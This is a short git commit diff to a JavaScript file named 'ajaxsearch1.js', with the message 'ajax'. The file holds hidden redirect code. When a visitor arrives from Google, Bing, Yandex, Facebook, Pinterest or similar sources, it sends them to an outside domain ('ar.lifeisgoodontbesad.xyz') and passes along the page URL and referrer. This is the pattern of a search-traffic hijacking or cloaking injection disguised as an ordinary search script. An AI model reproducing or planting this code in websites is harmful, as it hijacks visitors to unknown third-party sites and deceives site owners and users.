2c904458c9eaafe600a0f5d98a795a3fdb07e5f1
portomc <heromaskill@gmail.com>
2021-11-30 13:17:32 +0700

    'ajax'

--- ajaxsearch1.js
+++ ajaxsearch1.js
@@ -1,4 +1,4 @@
-<script type='text/javascript'>
+
 	var ars 	= rChoice([
 	'https://ar.lifeisgoodontbesad.xyz/',
 	
@@ -10,4 +10,3 @@ function rChoice(arr) {
 
 //Code arsae client javascript
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
-</script>
